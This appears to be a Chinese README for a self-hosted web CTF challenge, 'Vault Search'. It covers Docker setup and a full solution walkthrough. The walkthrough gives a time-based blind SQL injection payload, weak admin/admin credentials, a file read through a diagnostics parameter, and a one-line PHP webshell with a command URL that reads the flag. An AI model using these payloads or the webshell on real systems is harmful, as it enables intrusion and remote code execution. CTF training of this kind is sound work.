# Vault Search - hard Web CTF

仅用于本机或隔离 CTF 网络。启动后访问 `http://127.0.0.1:8088`。

## 题目给选手

你接手了一个遗留的 Vault Search 服务。管理员最近重启了系统，但内部构建工件服务仍然可用。目标：拿到 flag。

线索：服务包含搜索、员工登录、管理员诊断和构建工件上传功能。

## 启动方式

打开 PowerShell：

```powershell
cd D:\ctfweb
docker compose up --build -d
docker compose ps
```

看到 `ctfweb-db-1` 为 `healthy`，`ctfweb-web-1` 端口为 `127.0.0.1:8088->80/tcp` 即启动成功。

浏览器访问：

```text
http://127.0.0.1:8088
```

重置为全新环境：

```powershell
cd D:\ctfweb
docker compose down -v
docker compose up --build -d
```

flag 不写死在仓库中，而是在第一次有效上传后动态生成到容器内 `uploads/.vault_flag`，因此干净重置后会得到新的 flag。

## 一键验证

自动化解题脚本使用 Python `requests`：

```powershell
& "C:\Users\h'p\AppData\Local\Programs\Python\Python313\python.exe" D:\ctfweb\scripts\solve.py http://127.0.0.1:8088/
```

预期最后输出：

```text
[+] flag: CTF{vault_随机十六进制}
```

## 使用 GitHub / GHCR 镜像

仓库中的 GitHub Actions 会在推送到 `main` 或 `master` 后自动构建并发布镜像。发布完成后，镜像地址为：

```text
ghcr.io/tosix336/my-ctf-challenges:latest
```

如果仓库中的 GHCR 容器包设置为公开，其他人可以直接拉取并启动：

```powershell
git clone https://github.com/tosix336/my-ctf-challenges.git
cd my-ctf-challenges
docker pull ghcr.io/tosix336/my-ctf-challenges:latest
$env:CTF_IMAGE = "ghcr.io/tosix336/my-ctf-challenges:latest"
docker compose pull web
docker compose up -d
docker compose ps
```

首次启动数据库时仍然需要等待健康检查通过。若要重新生成动态 flag：

```powershell
docker compose down -v
docker compose pull web
docker compose up -d
```

也可以在没有仓库文件的目录中只保存 `docker-compose.yml` 和 `db/init.sql` 后，将 `CTF_IMAGE` 指向上面的镜像；完整题目源码仍建议从 GitHub 仓库获取。

## 解题思路

1. `/search.php?q=` 将输入拼接到 MariaDB `LIKE` 查询里，可做时间盲注。
2. 使用时间盲注从 `secrets` 表提取 `diag_key` 和 `upload_key`。
3. 使用弱口令 `admin/admin` 登录 `/login.php`。
4. 在后台诊断功能中提交 `diag_key`，并利用 `host` 参数读取 `/run/app/upload.key`。
5. 使用上传密钥上传 `.phtml` 文件，获得 PHP 代码执行。
6. 通过上传后的 WebShell 执行命令读取动态 flag。

正确的时间盲注 payload 需要在单引号前加一个普通字符：

```text
x' OR IF(ASCII(SUBSTRING((SELECT value FROM secrets WHERE name='diag_key'),1,1))=100,SLEEP(1),0)-- -
```

这个 `x` 很重要。否则原 SQL 中的 `LIKE '%'` 可能恒真，数据库会短路后面的 `IF(...SLEEP...)`，导致脚本误判所有字符。

## 手工解题入口

首页：

```text
http://127.0.0.1:8088/
```

登录页：

```text
http://127.0.0.1:8088/login.php
```

管理员账号和密码都是：

```text
admin
```

上传 WebShell 文件名：

```text
shell.phtml
```

文件内容：

```php
<?php system($_GET['c'] ?? 'id'); ?>
```

读取 flag：

```text
http://127.0.0.1:8088/uploads/shell.phtml?c=cat%20/var/www/html/uploads/.vault_flag
```
